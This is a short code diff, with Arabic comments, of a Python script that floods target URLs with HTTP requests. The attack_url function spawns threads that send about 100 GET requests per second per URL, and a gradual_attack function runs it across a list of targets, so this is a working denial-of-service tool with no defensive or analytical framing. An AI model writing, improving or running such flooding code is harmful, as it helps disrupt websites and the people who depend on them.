@@ -29,11 +29,13 @@ def load_urls():
 def attack_url(url):
     while is_running:
         try:
-            for _ in range(10):
-    threading.Thread(target=lambda: [requests.get(url) for _ in range(10)], daemon=True).start()
+            for _ in range(10):  # 10 مجموعات
+                # كل مجموعة ترسل 10 طلبات = 100 طلب تقريبا في الثانية
+                threading.Thread(target=lambda: [requests.get(url) for _ in range(10)], daemon=True).start()
         except:
             pass
-        time.sleep(1)  # تقليل الانتظار بين الدُفعات
+        time.sleep(1)
+  # تقليل الانتظار بين الدُفعات
 
 # بدء الإرسال تدريجياً لكل رابط
 def gradual_attack():
